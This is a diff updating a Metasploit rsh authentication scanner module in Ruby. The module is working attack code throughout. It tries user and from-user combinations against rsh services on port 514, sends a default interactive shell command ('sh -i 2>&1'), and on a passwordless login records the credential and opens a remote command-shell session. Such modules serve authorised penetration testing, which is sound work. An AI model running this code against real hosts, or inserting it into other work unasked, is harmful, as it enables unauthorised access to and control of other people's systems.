@@ -1,258 +1,275 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::RServices
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::CommandShell
+  include Msf::Sessions::CreateSessionOptions
+  include Msf::Auxiliary::ReportSummary
 
-require 'msf/core'
+  def initialize
+    super(
+      'Name' => 'rsh Authentication Scanner',
+      'Description' => %q{
+          This module will test a shell (rsh) service on a range of machines and
+        report successful logins.
 
-class Metasploit3 < Msf::Auxiliary
+        NOTE: This module requires access to bind to privileged ports (below 1024).
+      },
+      'References' => [
+        [ 'CVE', '1999-0651' ],
+        [ 'CVE', '1999-0502'] # Weak password
+      ],
+      'Author' => [ 'jduck' ],
+      'License' => MSF_LICENSE
+    )
 
-	include Msf::Exploit::Remote::Tcp
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::AuthBrute
-	include Msf::Auxiliary::RServices
-	include Msf::Auxiliary::Scanner
-	include Msf::Auxiliary::CommandShell
+    register_options(
+      [
+        Opt::RPORT(514),
+        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])
+      ]
+    )
+  end
 
-	def initialize
-		super(
-			'Name'        => 'rsh Authentication Scanner',
-			'Version'     => '$Revision$',
-			'Description' => %q{
-					This module will test a shell (rsh) service on a range of machines and
-				report successful logins.
+  def run_host(ip)
+    print_status("#{ip}:#{rport} - Starting rsh sweep")
 
-				NOTE: This module requires access to bind to privileged ports (below 1024).
-			},
-			'References' =>
-				[
-					[ 'CVE', '1999-0651' ],
-					[ 'CVE', '1999-0502'] # Weak password
-				],
-			'Author'      => [ 'jduck' ],
-			'License'     => MSF_LICENSE
-		)
+    cmd = datastore['CMD']
+    cmd ||= 'sh -i 2>&1'
 
-		register_options(
-			[
-				Opt::RPORT(514),
-				OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])
-			], self.class)
-	end
+    if datastore['ENABLE_STDERR']
+      # For each host, bind a privileged listening port for the target to connect
+      # back to.
+      ret = listen_on_privileged_port
+      if not ret
+        return :abort
+      end
 
-	def run_host(ip)
-		print_status("#{ip}:#{rport} - Starting rsh sweep")
+      sd, lport = ret
+    else
+      sd = lport = nil
+    end
 
-		cmd = datastore['CMD']
-		cmd ||= 'sh -i 2>&1'
+    # The maximum time for a host is set here.
+    Timeout.timeout(300) {
+      each_user_fromuser { |user, fromuser|
+        do_login(user, fromuser, cmd, sd, lport)
+      }
+    }
 
-		if datastore['ENABLE_STDERR']
-			# For each host, bind a privileged listening port for the target to connect
-			# back to.
-			ret = listen_on_privileged_port
-			if not ret
-				return :abort
-			end
-			sd, lport = ret
-		else
-			sd = lport = nil
-		end
+    sd.close if sd
+  end
 
-		# The maximum time for a host is set here.
-		Timeout.timeout(300) {
-			each_user_fromuser { |user, fromuser|
-				do_login(user, fromuser, cmd, sd, lport)
-			}
-		}
+  def each_user_fromuser(&block)
+    # Class variables to track credential use (for threading)
+    @@credentials_tried = {}
+    @@credentials_skipped = {}
 
-		sd.close if sd
-	end
+    credentials = extract_word_pair(datastore['USERPASS_FILE'])
 
+    users = load_user_vars()
+    credentials.each { |u, p| users << u }
+    users.uniq!
 
-	def each_user_fromuser(&block)
-		# Class variables to track credential use (for threading)
-		@@credentials_tried = {}
-		@@credentials_skipped = {}
+    fromusers = load_fromuser_vars()
 
-		credentials = extract_word_pair(datastore['USERPASS_FILE'])
+    cleanup_files()
 
-		users = load_user_vars()
-		credentials.each { |u,p| users << u }
-		users.uniq!
+    # We'll abuse this nice array combining function, despite its inaccurate name in this case :)
+    credentials = combine_users_and_passwords(users, fromusers)
 
-		fromusers = load_fromuser_vars()
+    fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
 
-		cleanup_files()
+    credentials.each do |u, fu|
+      break if @@credentials_skipped[fq_rest]
 
-		# We'll abuse this nice array combining function, despite its inaccurate name in this case :)
-		credentials = combine_users_and_passwords(users, fromusers)
+      fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]
 
-		fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
+      userpass_sleep_interval unless @@credentials_tried.empty?
 
-		credentials.each do |u,fu|
+      next if @@credentials_skipped[fq_user]
+      next if @@credentials_tried[fq_user] == fu
 
-			break if @@credentials_skipped[fq_rest]
+      ret = block.call(u, fu)
 
-			fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]
+      case ret
+      when :abort # Skip the current host entirely.
+        break
 
-			userpass_sleep_interval unless @@credentials_tried.empty?
+      when :next_user # This means success for that user.
+        @@credentials_skipped[fq_user] = fu
+        if datastore['STOP_ON_SUCCESS'] # See?
+          @@credentials_skipped[fq_rest] = true
+        end
 
-			next if @@credentials_skipped[fq_user]
-			next if @@credentials_tried[fq_user] == fu
+      when :skip_user # Skip the user in non-success cases.
+        @@credentials_skipped[fq_user] = fu
 
-			ret = block.call(u, fu)
+      when :connection_error # Report an error, skip this cred, but don't abort.
+        vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}' from '#{fu}'"
+      end
+      @@credentials_tried[fq_user] = fu
+    end
+  end
 
-			case ret
-			when :abort # Skip the current host entirely.
-				break
+  def do_login(user, luser, cmd, sfd, lport)
+    vprint_status("#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'")
 
-			when :next_user # This means success for that user.
-				@@credentials_skipped[fq_user] = fu
-				if datastore['STOP_ON_SUCCESS'] # See?
-					@@credentials_skipped[fq_rest] = true
-				end
+    # We must connect from a privileged port.
+    this_attempt ||= 0
+    ret = nil
+    while this_attempt <= 3 and (ret.nil? or ret == :refused)
+      if this_attempt > 0
+        # power of 2 back-off
+        select(nil, nil, nil, 2**this_attempt)
+        vprint_error "#{rhost}:#{rport} rsh - Retrying '#{user}' from '#{luser}' due to reset"
+      end
+      ret = connect_from_privileged_port
+      break if ret == :connected
 
-			when :skip_user # Skip the user in non-success cases.
-				@@credentials_skipped[fq_user] = fu
+      this_attempt += 1
+    end
 
-			when :connection_error # Report an error, skip this cred, but don't abort.
-				vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}' from '#{fu}'"
-			end
-			@@credentials_tried[fq_user] = fu
-		end
-	end
+    return :abort if ret != :connected
 
+    sock.put("#{lport}\x00#{luser}\x00#{user}\x00#{cmd}\x00")
 
-	def do_login(user, luser, cmd, sfd, lport)
-		vprint_status("#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'")
+    if sfd and lport
+      stderr_sock = sfd.accept
+      add_socket(stderr_sock)
+    else
+      stderr_sock = nil
+    end
 
-		# We must connect from a privileged port.
-		this_attempt ||= 0
-		ret = nil
-		while this_attempt <= 3 and (ret.nil? or ret == :refused)
-			if this_attempt > 0
-				# power of 2 back-off
-				select(nil, nil, nil, 2**this_attempt)
-				vprint_error "#{rhost}:#{rport} rsh - Retrying '#{user}' from '#{luser}' due to reset"
-			end
-			ret = connect_from_privileged_port
-			break if ret == :connected
-			this_attempt += 1
-		end
+    # NOTE: We report this here, since we are awfully convinced now that this is really
+    # an rsh service.
+    report_service(
+      :host => rhost,
+      :port => rport,
+      :proto => 'tcp',
+      :name => 'shell'
+    )
 
-		return :abort if ret != :connected
+    # Read the expected nul byte response.
+    buf = sock.get_once(1) || ''
+    if buf != "\x00"
+      buf = sock.get_once(-1)
+      if buf.nil?
+        return :failed
+      end
 
-		sock.put("#{lport}\x00#{luser}\x00#{user}\x00#{cmd}\x00")
+      result = buf.gsub(/[[:space:]]+/, ' ')
+      vprint_error("Result: #{result}")
+      return :skip_user if result =~ /locuser too long/
 
-		if sfd and lport
-			stderr_sock = sfd.accept
-			add_socket(stderr_sock)
-		else
-			stderr_sock = nil
-		end
+      return :failed
+    end
 
-		# NOTE: We report this here, since we are awfully convinced now that this is really
-		# an rsh service.
-		report_service(
-			:host => rhost,
-			:port => rport,
-			:proto => 'tcp',
-			:name => 'shell'
-		)
+    # should we report a vuln here? rsh allowed w/o password?!
+    print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
+    start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)
 
-		# Read the expected nul byte response.
-		buf = sock.get_once(1) || ''
-		if buf != "\x00"
-			buf = sock.get_once(-1)
-			if buf.nil?
-				return :failed
-			end
-			result = buf.gsub(/[[:space:]]+/, ' ')
-			vprint_error("Result: #{result}")
-			return :skip_user if result =~ /locuser too long/
-			return :failed
-		end
+    return :next_user
 
-		# should we report a vuln here? rsh allowed w/o password?!
-		print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
-		start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)
+  # For debugging only.
+  # rescue ::Exception
+  #	print_error("#{$!}")
+  #	return :abort
+  ensure
+    disconnect()
+  end
 
-		return :next_user
+  #
+  # This is only needed by RSH so it is not in the rservices mixin
+  #
+  def listen_on_privileged_port
+    lport = 1023
+    sd = nil
+    while lport > 512
+      # vprint_status("Trying to listen on port #{lport} ..")
+      sd = nil
+      begin
+        sd = Rex::Socket.create_tcp_server('LocalPort' => lport)
+      rescue Rex::BindFailed
+        # Ignore and try again
+      end
 
-	# For debugging only.
-	#rescue ::Exception
-	#	print_error("#{$!}")
-	#	return :abort
+      break if sd
 
-	ensure
-		disconnect()
+      lport -= 1
+    end
 
-	end
+    if not sd
+      print_error("Unable to bind to listener port")
+      return false
+    end
 
+    add_socket(sd)
+    # print_status("Listening on port #{lport}")
+    [ sd, lport ]
+  end
 
-	#
-	# This is only needed by RSH so it is not in the rservices mixin
-	#
-	def listen_on_privileged_port
-		lport = 1023
-		sd = nil
-		while lport > 512
-			#vprint_status("Trying to listen on port #{lport} ..")
-			sd = nil
-			begin
-				sd = Rex::Socket.create_tcp_server('LocalPort' => lport)
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-			rescue Rex::AddressInUse
-				# Ignore and try again
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
 
-			end
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
 
-			break if sd
-			lport -= 1
-		end
+    create_credential_login(login_data)
+  end
 
-		if not sd
-			print_error("Unable to bind to listener port")
-			return false
-		end
+  def start_rsh_session(host, port, user, luser, proof, stderr_sock)
+    service_data = {
+      address: host,
+      port: port,
+      service_name: 'shell',
+      proof: proof,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-		add_socket(sd)
-		#print_status("Listening on port #{lport}")
-		[ sd, lport ]
-	end
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: user,
+      # Save a reference to the socket so we don't GC prematurely
+      stderr_sock: stderr_sock
+    }.merge(service_data)
 
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
 
-	def start_rsh_session(host, port, user, luser, proof, stderr_sock)
-		report_auth_info(
-			:host	=> host,
-			:port	=> port,
-			:sname => 'shell',
-			:user	=> user,
-			:luser => luser,
-			:proof  => proof,
-			:source_type => "user_supplied",
-			:active => true
-		)
-
-		merge_me = {
-			'USER_FILE'     => nil,
-			'FROMUSER_FILE' => nil,
-			'USERNAME'      => user,
-			'FROMUSER'      => user,
-			# Save a reference to the socket so we don't GC prematurely
-			:stderr_sock    => stderr_sock
-		}
-
-		# Don't tie the life of this socket to the exploit
-		self.sockets.delete(stderr_sock)
-
-		start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", merge_me)
-	end
-
+    if datastore['CreateSession']
+      start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", login_data, nil, self.sock)
+      # Don't tie the life of this socket to the exploit
+      self.sockets.delete(stderr_sock)
+      self.sock = nil
+    end
+  end
 end
